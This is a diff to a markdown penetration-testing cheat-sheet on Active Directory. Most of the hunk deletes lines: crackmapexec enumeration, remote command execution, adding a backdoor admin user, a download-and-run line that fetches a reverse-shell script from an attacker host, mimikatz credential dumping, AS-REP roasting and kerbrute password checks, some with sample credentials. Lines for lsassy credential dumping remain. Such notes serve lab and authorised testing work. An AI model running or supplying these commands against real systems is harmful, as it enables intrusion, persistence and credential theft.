@@ -243,71 +243,11 @@ runas /user:<hostname>\<user> cmd.exe
 
 
 # Active Directory Pentesting
-## Enumeration (use LdapDomainDump and crackmapexec to enumerate)
-- Precondition is to get domainname from NMAP: `nmap -A 192.168.1.50 -Pn` -> under `NetBIOS_Domain_Name: PENTESTING`
-- First, detect if the SMB signing is enabled, which helps us identify machines that could be targeted for stealing hashes and relay attacks.
-
-### LdapDomainDump
-- Download: `git clone https://github.com/dirkjanm/ldapdomaindump`
-- got ldap dump: `python3 ldapdomaindump.py --user DOMAIN\\username -p Password12345 ldap://x.x.x.x:389 --no-json --no-grep -o data`
-- find Domain admin `DONT_REQ_PREAUTH` -> crack hash offline
-
-### enum4linux
-- Built-in in kali linux
-- Full target AD info: `enum4linux -u ippsec -p Password12345 -a 192.168.1.50`
-- Provides Domain SID, passwords of some users, share enumerations
-
-### crackmapexec
-- Built-in in kali linux
-- enumerate shares (check for READ/WRITE permissions): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-auth --shares`
-- enumerate logged on users (check if they are domain admin): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
-- RID enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute`
-- local grp enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-groups`
-- Get the active sessions: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions`
-- Generate a list of relayable hosts (SMB Signing disabled): `crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt`
-- Get the password policy: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol`
-- Command execution(e.g. wget,ipconfig, whoami/groups): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Invoke-WebRequest -Uri "http://192.168.1.223:8000/users.txt"'`
-- create new user for persistence(in case ippsec change pw): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net user /add admin Password12345'`
-- add user to localgroup: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net local group administrators'`
-
-## Persistence
-### crackmapexec
-- Reverse shell: [Edit this from Kali to Windows](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
-- Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
-- Reverse shell script will autorun upcon transfer
-
-## dumping credentials
-### crackmapexec's mimikatz
-- `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345`
-- `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444`
-- stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log`
-- stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log`
 
 ### crackmapexec's lsassy
 - `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345`
 - `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345 --server-port 444`
 - does not store logs locally
-
-### test for a quick No-Preauth win without supplying a username
-```
-GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
-```
-
-### tool to brute force of a valid username based on info collection so far (not unbounded brute force)
-```bash
-kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
-```
-
-### test if credentials are valid
-```bash
-kerbrute.py -user 'fsmith' -password 'Thestrokes23' -dc-ip 10.10.10.175 -domain Egotistical-bank.local
-```
-
-## SKIPPED [Powershell Empire](https://github.com/BC-SECURITY/Empire) 
-- Post exploitation for AD
-- Install: `sudo apt install powershell-empire`
-- Run: `sudo powershell-empire`
-
 
 ### Powerview
 
